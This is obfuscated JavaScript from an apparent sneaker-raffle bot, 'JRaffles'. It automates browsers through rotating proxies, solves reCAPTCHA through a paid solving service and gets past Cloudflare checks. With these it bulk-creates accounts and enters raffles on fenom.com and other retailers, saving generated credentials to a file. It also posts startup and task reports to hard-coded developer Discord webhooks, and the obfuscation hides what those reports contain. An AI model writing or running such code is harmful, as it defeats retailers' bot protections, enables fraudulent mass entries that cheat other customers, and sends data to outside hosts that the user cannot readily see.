            _0x282465 = 'no', _0x4cb72b(_0x4ce8ec[_0x5c5161], _0x2289a8), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x1efff1 = await _0x2463d6(_0x4ce8ec[_0x5c5161], _0x2289a8, 'dev', ![]), _0x3b94d3 = await _0x2463d6(_0x4ce8ec[_0x5c5161], _0x2289a8, 'pub', ![]);
            const _0x15403c = {
                'succesDEVMSG': { 'embeds': [_0x1efff1] },
                'succesPUBMSG': { 'embeds': [_0x3b94d3] }
            };
            try {
                _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x15403c['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x15403c['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x5bae61, _0x15403c['succesPUBMSG']);
            } catch (_0x3dfbe4) {
                console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3dfbe4));
            }
        } catch (_0x37e0d3) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20' + _0x37e0d3)), _0x282465 = 'yes', _0x591292 = '' + _0x37e0d3;
            var _0xb19c7a = await _0x2463d6(_0x4ce8ec[_0x5c5161], _0x2289a8, 'dev', !![], _0x591292), _0x1efff1 = await _0x2463d6(_0x4ce8ec[_0x5c5161], _0x2289a8, 'dev', ![]), _0x3b94d3 = await _0x2463d6(_0x4ce8ec[_0x5c5161], _0x2289a8, 'pub', ![]);
            const _0xd438d = {
                'succesDEVMSG': { 'embeds': [_0x1efff1] },
                'succesPUBMSG': { 'embeds': [_0x3b94d3] }
            };
            _0xd438d['errorDEV'] = { 'embeds': [_0xb19c7a] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0xd438d['errorDEV']), await _0x31fc49(_0x344612, _0xd438d['errorDEV']);
        } finally {
            _0x1da2c4['close']();
            if (_0x282465 == 'yes' && _0x242be2 != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Retrying')), _0x5c5161 = _0x5c5161 - 0x1, _0x242be2 = _0x242be2 + 0x1;
                continue;
            }
            _0x282465 == 'yes' && _0x242be2 >= 0x5 && (_0x29520a(_0x4ce8ec[_0x5c5161], _0x2289a8), _0x282465 = 'no', _0x242be2 = 0x0), console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0xb98976(_0x1a65f9, _0x50fc7c, _0x5e7590) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1e080b = 0x0; _0x1e080b < _0x1a65f9['length']; _0x1e080b++) {
        if (_0x40250a != 'yes')
            var _0x40250a = '', _0xb047c5 = 0x0;
        var _0x485002;
        await _0x43304e(_0x1a65f9, _0x1e080b), _0x757e32(_0x5e7590['name'] + '\x20Task\x20' + (_0x1e080b + 0x1) + '\x20/\x20' + _0x1a65f9['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        var _0x46b427 = await _0x2463d6(_0x1a65f9[_0x1e080b], _0x5e7590, 'acc', ![]);
        const _0x16fb2e = { 'succesDEVMSG': { 'embeds': [_0x46b427] } }, _0x629a6b = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x267f54 = Math['round'](Math['random']() * (_0x50fc7c['length'] - 0x1)), _0x4ceeaf = _0x50fc7c[_0x267f54]['split'](':'), _0x32a79e;
        try {
            _0x32a79e = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4ceeaf[0x0] + ':' + _0x4ceeaf[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x32a79e = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4ceeaf[0x0] + ':' + _0x4ceeaf[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x2a45f8 = await _0x32a79e['newPage']();
            await _0x2a45f8['setViewport']({
                'width': 0x500 + _0x368412(0x1, 0x32),
                'height': 0x2d9 + _0x368412(0x1, 0x32)
            });
            const _0x3e1d8c = await _0x2a45f8['target']()['createCDPSession'](), { windowId: _0x433434 } = await _0x3e1d8c['send']('Browser.getWindowForTarget');
            await _0x2a45f8['authenticate']({
                'username': '' + _0x4ceeaf[0x2],
                'password': '' + _0x4ceeaf[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a45f8['goto']('' + _0x629a6b, { 'waitUntil': 'networkidle2' }), await _0x29ac01(0x1388), console['log'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x2f4c78 = await _0x2a45f8['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x2f4c78 && await _0x2f4c78['click']();
            } catch {
            }
            await _0x3e1d8c['send']('Browser.setWindowBounds', {
                'windowId': _0x433434,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x2a45f8['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x29ac01(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2a45f8['type']('input[name=\x22firstname\x22]', '' + _0x1a65f9[_0x1e080b]['FirstName']), await _0x29ac01(0x1f4), await _0x2a45f8['type']('input[name=\x22lastname\x22]', '' + _0x1a65f9[_0x1e080b]['LastName']), await _0x29ac01(0x1f4), await _0x2a45f8['type']('input[name=\x22email\x22]', '' + _0x1a65f9[_0x1e080b]['Email']), await _0x29ac01(0x1f4), await _0x2a45f8['type']('input[name=\x22password\x22]', '' + _0x1a65f9[_0x1e080b]['Password']), await _0x29ac01(0x258), await _0x2a45f8['$eval']('input[name=\x22psgdpr\x22]', _0x38f5fc => _0x38f5fc['click']()), await _0x29ac01(0x1f4), console['log'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2a45f8['$eval']('#customer-form', _0x29ec95 => _0x29ec95['submit']());
            try {
                await _0x2a45f8['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x40250a = 'no', console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Account\x20' + _0x1a65f9[_0x1e080b]['Email'] + '\x20Generated')), _0x45be1e['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1a65f9[_0x1e080b]['Email'] + ',' + _0x1a65f9[_0x1e080b]['Password']);
                try {
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x16fb2e['succesDEVMSG']);
                } catch {
                }
                await _0x31fc49(_0x201dd3, _0x16fb2e['succesDEVMSG']);
            } catch (_0x3d6e00) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x3d6e00);
            }
        } catch (_0x23e539) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20' + _0x23e539)), _0x485002 = '' + _0x23e539;
            var _0x3ecc06 = await _0x2463d6(_0x1a65f9[_0x1e080b], _0x5e7590, 'acc', !![], _0x485002);
            _0x16fb2e['errorDEV'] = { 'embeds': [_0x3ecc06] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x16fb2e['errorDEV']), await _0x31fc49(_0x344612, _0x16fb2e['errorDEV']), _0x40250a = 'yes';
        } finally {
            _0x32a79e['close']();
            if (_0x40250a == 'yes' && _0xb047c5 != 0x5 && _0x485002 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Task\x20' + (_0x1e080b + 0x1) + '\x20:\x20Retrying')), _0x1e080b = _0x1e080b - 0x1, _0xb047c5 = _0xb047c5 + 0x1;
                continue;
            }
            _0x40250a == 'yes' && _0xb047c5 >= 0x5 && (_0x29520a(_0x1a65f9[_0x1e080b], _0x5e7590), _0x40250a = 'no', _0xb047c5 = 0x0), console['log'](_0x91a29b() + '\x20[' + _0x5e7590['name'] + ']\x20Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x3aec8d(_0x556710, _0x44f78b, _0x578267) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2090b8 = 0x0; _0x2090b8 < _0x556710['length']; _0x2090b8++) {
        if (_0x4b4abe != 'yes')
            var _0x4b4abe = '', _0x561476 = 0x0;
        var _0x218a3;
        await _0x43304e(_0x556710, _0x2090b8), _0x757e32(_0x578267['name'] + '\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20/\x20' + _0x556710['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        const _0x31fb03 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x564a4c = Math['round'](Math['random']() * (_0x44f78b['length'] - 0x1)), _0x4e76f7 = _0x44f78b[_0x564a4c]['split'](':'), _0x3ff571;
        try {
            _0x3ff571 = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4e76f7[0x0] + ':' + _0x4e76f7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x3ff571 = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4e76f7[0x0] + ':' + _0x4e76f7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x1200ae = await _0x3ff571['newPage'](), _0x46f05d = await _0x1200ae['target']()['createCDPSession'](), { windowId: _0x1afb75 } = await _0x46f05d['send']('Browser.getWindowForTarget');
            await _0x1200ae['authenticate']({
                'username': '' + _0x4e76f7[0x2],
                'password': '' + _0x4e76f7[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1200ae['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x29ac01(0xbb8), await _0x46f05d['send']('Browser.setWindowBounds', {
                'windowId': _0x1afb75,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x29ac01(0x1f40);
            try {
                await _0x1200ae['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x29ac01(0x1388), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1200ae['type']('input[name=\x22email\x22]', '' + _0x556710[_0x2090b8]['Email']), await _0x29ac01(0x1f4), await _0x1200ae['type']('input[name=\x22password\x22]', '' + _0x556710[_0x2090b8]['Password']), await _0x29ac01(0x258), await _0x1200ae['$eval']('#login-form', _0x55e4e5 => _0x55e4e5['submit']()), await _0x1200ae['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x29ac01(0x1f4), await _0x1200ae['goto']('' + _0x556710[_0x2090b8]['Url']), await _0x1200ae['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x556710[_0x2090b8]['Size']);
            if (_0x556710[_0x2090b8]['Size'] != 'RANDOM') {
                var _0x3ad195 = '\x20' + _0x556710[_0x2090b8]['Size'] + '\x20';
                const _0xf30e2c = await _0x1200ae['$x']('//span[contains(text(),\x20' + _0x3ad195 + ')]');
                await _0xf30e2c[0x0]['click']();
            } else {
                const _0x42162b = await _0x1200ae['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x588c6f = Math['round'](Math['random']() * (_0x42162b['length'] - 0x1));
                await _0x42162b[_0x588c6f]['click']();
            }
            await _0x29ac01(0x258), await _0x1200ae['click']('#cookieChoiceDismiss'), await _0x29ac01(0x3e8), await _0x1200ae['type']('#instagram-account', '' + _0x556710[_0x2090b8]['Follower']), await _0x29ac01(0x28a), await _0x1200ae['click']('#book-btn'), await _0x29ac01(0xbb8), await _0x1200ae['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x29ac01(0x1f4), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20' + _0x3e6680['cyan']('Solving\x20Captcha')), await _0x1200ae['solveRecaptchas'](), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x29ac01(0x7d0), await _0x1200ae['$eval']('#book-btn-for-sure', _0x3ac4f7 => _0x3ac4f7['click']()), await _0x29ac01(0x12c), await _0x1200ae['click']('#book-btn-for-sure'), await _0x29ac01(0xdac);
            const _0x5a64d3 = await _0x1200ae['$eval']('.reservation-popup\x20>\x20.title', _0x5d5d50 => {
                return _0x5d5d50['innerHTML'];
            });
            if (_0x5a64d3) {
                _0x4b4abe = 'no', _0x4cb72b(_0x556710[_0x2090b8], _0x578267), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x401449 = await _0x2463d6(_0x556710[_0x2090b8], _0x578267, 'dev', ![]), _0x572ee6 = await _0x2463d6(_0x556710[_0x2090b8], _0x578267, 'pub', ![]);
                const _0x28f61f = {
                    'succesDEVMSG': { 'embeds': [_0x401449] },
                    'succesPUBMSG': { 'embeds': [_0x572ee6] }
                };
                try {
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x28f61f['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x28f61f['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x5bae61, _0x28f61f['succesPUBMSG']);
                } catch (_0x265b11) {
                    console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x265b11));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x4c118b) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20' + _0x4c118b)), _0x218a3 = '' + _0x4c118b;
            var _0x2576d8 = await _0x2463d6(_0x556710[_0x2090b8], _0x578267, 'dev', !![], _0x218a3), _0x401449 = await _0x2463d6(_0x556710[_0x2090b8], _0x578267, 'dev', ![]), _0x572ee6 = await _0x2463d6(_0x556710[_0x2090b8], _0x578267, 'pub', ![]);
            const _0x31c222 = {
                'succesDEVMSG': { 'embeds': [_0x401449] },
                'succesPUBMSG': { 'embeds': [_0x572ee6] }
            };
            _0x31c222['errorDEV'] = { 'embeds': [_0x2576d8] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x31c222['errorDEV']), await _0x31fc49(_0x344612, _0x31c222['errorDEV']), _0x4c118b != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4b4abe = 'yes');
        } finally {
            _0x3ff571['close']();
            if (_0x4b4abe == 'yes' && _0x561476 != 0x5 && _0x218a3 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Task\x20' + (_0x2090b8 + 0x1) + '\x20:\x20Retrying')), _0x2090b8 = _0x2090b8 - 0x1, _0x561476 = _0x561476 + 0x1;
                continue;
            }
            _0x4b4abe == 'yes' && _0x561476 >= 0x5 && (_0x29520a(_0x556710[_0x2090b8], _0x578267), _0x4b4abe = 'no', _0x561476 = 0x0), console['log'](_0x91a29b() + '\x20[' + _0x578267['name'] + ']\x20Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x397815() {
    await _0x19de76(), console['clear']();
    if (_0x582dcf != 'devkey') {
        let _0x541bcc = await _0x53fd7a['autoUpdate']();
        if (_0x541bcc === 'yes')
            return _0x42f946('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x23aafa == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x29ac01(0x2710);
        ;
    }
    await _0xfc23da(_0x23aafa);
    if (_0x111a5a === ![])
        return console['log']('Closing\x20Browser'), await _0x29ac01(0xbb8);
    else
        try {
            var _0x1c14a0 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0xf76913
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x582dcf
                    }
                ]
            }];
            const _0x112e5a = { 'embeds': _0x1c14a0 };
            var _0x2697bc = await _0x2463d6(null, null, 'open', ![]);
            const _0x4dc55f = { 'openDEVMSG': { 'embeds': [_0x2697bc] } };
            await _0x31fc49(_0x844abe, _0x4dc55f['openDEVMSG']);
            async function _0x5db02a() {
                _0x757e32('JRaffles\x20' + _0x582dcf), console['clear'](), console['log']('Welcome\x20to\x20' + _0x3e6680['cyan']('JRaffles();') + '\x20' + _0x582dcf), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x4b5308 = 0x0; _0x4b5308 < _0x7d2206['length'] - 0x3; _0x4b5308++) {
                    if (_0x7d2206[_0x4b5308]['name'] === 'Reload\x20Settings' || _0x7d2206[_0x4b5308]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x4b5308 + ')\x20[' + _0x7d2206[_0x4b5308]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x7d2206['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x7d2206['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x7d2206['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x5e856a();
                if (taskModule > _0x7d2206['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x29ac01(0x3e8), _0x5db02a();
                if (_0x7d2206[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                    var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x568e8a = await _0x115f3f(), _0x10ae1e = await _0x25bb74();
                        await _0xf61ce0(_0x10ae1e, _0x568e8a, _0x2b0777);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x568e8a = await _0x115f3f(), _0x10ae1e = await _0x25bb74();
                            await _0x2cf632(_0x10ae1e, _0x568e8a, _0x2b0777);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x568e8a = await _0x115f3f(), _0x51cca0 = await _0x2a3ba6(), _0x2516bb = _0x51cca0['split'](';');
                                await _0x4b72b5(_0x2516bb, _0x568e8a, _0x2b0777);
                            }
                        }
                    }
                    return _0x5db02a();
                }
                if (_0x7d2206[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                        var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x568e8a = await _0x115f3f(), _0x3915fa = await _0x25bb74();
                            await _0x3aec8d(_0x3915fa, _0x568e8a, _0x2b0777);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x568e8a = await _0x115f3f(), _0x3915fa = await _0x25bb74();
                                await _0xb98976(_0x3915fa, _0x568e8a, _0x2b0777);
                            }
                        }
                    } catch (_0x45530e) {
                        console['log'](_0x45530e), await _0x29ac01(0xfa0);
                    }
                    return _0x5db02a();
                }
                if (_0x7d2206[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                    var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x568e8a = await _0x115f3f(), _0x4e4cf4 = await _0x25bb74();
                    if (_0x4e4cf4[0x0]['Url'] == '' || _0x4e4cf4[0x0]['Url'] == undefined) {
                        await _0x555691(_0x568e8a);
                        var _0x4f48df = await _0x59b006();
                        return await afewFunction('' + _0xa9c228[_0x4f48df], 'nor', _0x2b0777, _0x4e4cf4, _0x568e8a), _0x5db02a();
                    }
                    return await afewFunction(_0x4e4cf4[0x0]['Url'], 'nor', _0x2b0777, _0x4e4cf4, _0x568e8a), _0x5db02a();
                } else {
                    if (_0x7d2206[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                        var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x568e8a = await _0x115f3f(), _0x4c1bc7 = await _0x25bb74();
                            console['log']('Starting\x20' + _0x4c1bc7['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x4ec330 = 0x0; _0x4ec330 < _0x4c1bc7['length']; _0x4ec330++) {
                                console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x5e14e2(_0x4ec330, 'nor', _0x2b0777, _0x4c1bc7, _0x568e8a), console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Sleeping\x20for\x20' + _0x2cde8d['MahaDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['MahaDelay']);
                                } catch (_0x3ddfc3) {
                                    console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Error\x20' + _0x3ddfc3));
                                }
                            }
                            ;
                            return _0x5db02a();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x568e8a = await _0x115f3f();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x51cca0 = await _0x2a3ba6(), _0x2516bb = _0x51cca0['split'](';'), console['log'](_0x2516bb['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x4ec330 = 0x0; _0x4ec330 < _0x2516bb['length']; _0x4ec330++) {
                                    _0x2b0777['url'] = _0x2516bb[_0x4ec330], console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x5e14e2(_0x4ec330, 'ver', _0x2b0777, _0x4c1bc7, _0x568e8a), console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Sleeping\x20for\x20' + _0x2cde8d['verificationDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['verificationDelay']);
                                    } catch (_0x40739f) {
                                        console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Error\x20' + _0x40739f));
                                    }
                                }
                                ;
                                return _0x5db02a();
                            }
                        }
                    } else {
                        if (_0x7d2206[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                            var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction], _0x568e8a = await _0x115f3f(), _0x26ae3e = await _0x25bb74();
                            return await _0x342c88(_0x26ae3e, _0x568e8a, _0x2b0777), await _0x29ac01(0x1388), _0x5db02a();
                        } else {
                            if (_0x7d2206[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x568e8a = await _0x115f3f(), _0x2c9c7a = await _0x25bb74();
                                    console['log']('Starting\x20' + _0x3e6680['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x4ec330 = 0x0; _0x4ec330 < _0x2c9c7a['length']; _0x4ec330++) {
                                        console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x346ec0(_0x4ec330, 'nor', _0x2b0777, _0x2c9c7a, _0x568e8a);
                                        } catch (_0x3f2d2a) {
                                            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Task\x20failed\x20' + _0x3f2d2a));
                                        }
                                        console['log'](_0x91a29b() + '\x20[' + _0x2b0777['name'] + ']\x20Sleeping\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
                                    }
                                    return _0x5db02a();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x568e8a = await _0x115f3f();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x51cca0 = await _0x2a3ba6(), _0x2516bb = _0x51cca0['split'](';'), console['log'](_0x2516bb['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x4ec330 = 0x0; _0x4ec330 < _0x2516bb['length']; _0x4ec330++) {
                                            try {
                                                _0x2b0777['url'] = _0x2516bb[_0x4ec330], console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x4ec330 + 0x1) + ':\x20Getting\x20Session'), await _0x346ec0(_0x4ec330, 'ver', _0x2b0777, null, _0x568e8a), console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x2cde8d['verificationDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['verificationDelay']);
                                            } catch (_0x1de14d) {
                                                console['log'](_0x1de14d), await _0x29ac01(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x5db02a();
                                    }
                                }
                                ;
                            } else {
                                if (_0x7d2206[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                    var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x50f023('https://bouncewear.com/nl/account/register', _0x2b0777);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x7d2206[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                        var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x568e8a = await _0x115f3f(), _0x156e63 = await _0x25bb74();
                                            return await _0x4d4147('https://patta.nl/account/register', _0x2b0777, _0x156e63, _0x568e8a), _0x5db02a();
